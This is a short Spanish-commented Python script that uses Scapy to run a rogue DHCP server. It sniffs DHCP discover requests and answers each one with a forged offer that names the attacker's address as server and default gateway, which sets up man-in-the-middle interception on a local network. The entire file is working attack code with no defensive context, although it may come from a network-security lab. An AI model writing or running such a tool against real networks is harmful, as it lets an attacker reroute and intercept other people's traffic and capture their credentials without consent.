# -*- coding: utf-8 -*-
from scapy.all import *

IP_ATACANTE = "202.4.14.4"
IP_OFERTA = "202.4.14.100"

def rogue_handler(pkt):
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 1:
        print("Peticion detectada de: " + pkt[Ether].src)

        offer = Ether(dst=pkt[Ether].src) / \
                IP(src=IP_ATACANTE, dst=IP_OFERTA) / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, yiaddr=IP_OFERTA, siaddr=IP_ATACANTE, chaddr=pkt[Ether].src) / \
                DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", IP_ATACANTE),
                    ("router", IP_ATACANTE),
                    ("name_server", "8.8.8.8"),
                    "end"
                ])

        sendp(offer, verbose=0)
        print("Oferta enviada con IP: " + IP_OFERTA)

print("Iniciando DHCP Rogue Server...")
sniff(filter="udp and (port 67 or 68)", prn=rogue_handler)
